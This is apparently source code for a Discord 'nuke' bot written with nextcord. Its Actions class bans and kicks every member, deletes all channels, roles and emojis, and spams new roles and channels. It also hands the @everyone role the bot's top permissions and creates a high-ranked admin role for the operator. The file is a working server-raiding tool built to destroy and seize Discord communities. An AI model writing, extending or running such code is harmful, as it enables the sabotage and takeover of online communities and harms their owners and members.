import random
from datetime import datetime


from nextcord.ext import commands
from nextcord.ext.commands import Bot
from nextcord import Guild, TextChannel, Embed, Color, Colour, Message
from config.config_handler import ConfigHandler
from utils.server_utils import ServerUtils
from middlewares.bot_permissions import BotPermissions
from errors.custom_exceptions.command_execution import *
from middlewares.bag import Bag

class Actions():
    
    config_handler = ConfigHandler()
    permissions = BotPermissions()
    utils = ServerUtils()
    bag = Bag()
    
    async def nuke(self, 
                   bot: Bot,
                   guild: Guild,
                   message: str,
                   color_roles: int,
                   roles_names: list,
                   channels_names: list,
                   quantity_roles: list,
                   quantity_channels: int,
                   quantity_messages: int,
                   send_message: Message,
                   load_embed: Embed):
    
        pass
    
    async def ban_all_users(self, guild: Guild):
    
        ban_count = 0
        
        self.bag.add(guild.id)
        
        for member in guild.members:
                try:
                    await member.ban()
                    ban_count += 1
                    
                except: continue
                
        self.bag.delete(guild.id)
        
        return ban_count
    
    async def kick_all_users(self, guild: Guild):
    
        kicks_count = 0
        
        self.bag.add(guild.id)
        
        for member in guild.members:
                try:
                    await member.kick()
                    kicks_count += 1
                    
                except: continue
                
        self.bag.delete(guild.id)
                
        return kicks_count
    
    async def delete_all_emojis(self, guild: Guild):
    
        emojis_delete_count = 0
        
        self.bag.add(guild.id)
        
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                emojis_delete_count += 1
                
            except: continue
            
        self.bag.delete(guild.id)
            
        return emojis_delete_count
    
    async def delete_all_chanells(self, guild: Guild):

        channels_delete_count = 0
        
        self.bag.add(guild.id)
        
        for channel in guild.channels:
            try:
                await channel.delete()
                channels_delete_count += 1
                
            except: continue
                
        self.bag.delete(guild.id)
            
        return channels_delete_count
    
    async def delete_all_roles(self, guild: Guild):
        roles_delete_count = 0
        
        self.bag.add(guild.id)
        
        for role in guild.roles:
            try:
                if role.name != self.config_handler.get_admin_role_name():
                    await role.delete()
                    roles_delete_count += 1
                
            except: continue
            
        self.bag.delete(guild.id)
            
        return roles_delete_count
    
    async def create_many_roles(self, guild: Guild, quantity: int, color: int, names: list):
        
        roles_create_count = 0
    
        self.bag.add(guild.id)
        
        for x in range(quantity):
            try:
                await guild.create_role(name = random.choice(names),
                                        permissions = guild.default_role.permissions,
                                        color = Colour(color))
                
                roles_create_count += 1
                
            except Exception as e: print(e)
            
        self.bag.delete(guild.id)
            
        return roles_create_count
    
    async def create_admin_role(self, guild: Guild, color: int, name: str):

        try:
            role = await guild.create_role(name = name,
                                           color = Colour(color),
                                            permissions = guild.me.top_role.permissions)
            
            await role.edit(position = guild.me.top_role.position -1) 
            
        except: return False           
        
        return role
    
    async def set_admin_everyone(self, guild: Guild):
        
        try:
            everyone_role = guild.default_role
            await everyone_role.edit(permissions = guild.me.top_role.permissions)
            
        except: return False           
        
        return True
    
    async def create_many_channels(self,
                                   bot: commands.Bot,
                                   guild: Guild,
                                   message: str,
                                   channels_names: list,
                                   quantity_channels: int,
                                   quantity_messages: int):
        
        channels_create_count = 0
        channels_names = self.utils.format_channels_names(channels_names)
        
        self.bag.add(guild.id)
        
        for x in range(quantity_channels):
            try:
                channel = await guild.create_text_channel(random.choice(channels_names))
                bot.dispatch("guild_channel_create",
                                    channel,
                                    message,
                                    quantity_messages,
                                    channels_names)
                
                channels_create_count += 1
                
            except: continue
            
        self.bag.delete(guild.id)
            
        return channels_create_count
    
    async def unban_all_users(self, guild: Guild):
        
        unbans_count = 0
        bans = guild.bans()
        
        self.bag.add(guild.id)
        
        async for user_baned in bans:
            
            try:
                await guild.unban(user_baned.user)
                unbans_count += 1    
                
            except Exception as e:
                continue
            
            
        self.bag.delete(guild.id)
            
        return unbans_count
    
    async def create_invite(self, guild: Guild):
        
        for channel in guild.channels:
            
            if (isinstance(channel, TextChannel) and 
                channel.permissions_for(guild.me).create_instant_invite):
                try:
                    invite = await channel.create_invite(max_age=86400)
                    return invite
                
                except: 
                    raise BotCanNotCreateInvite()
                
        raise BotCanNotCreateInvite()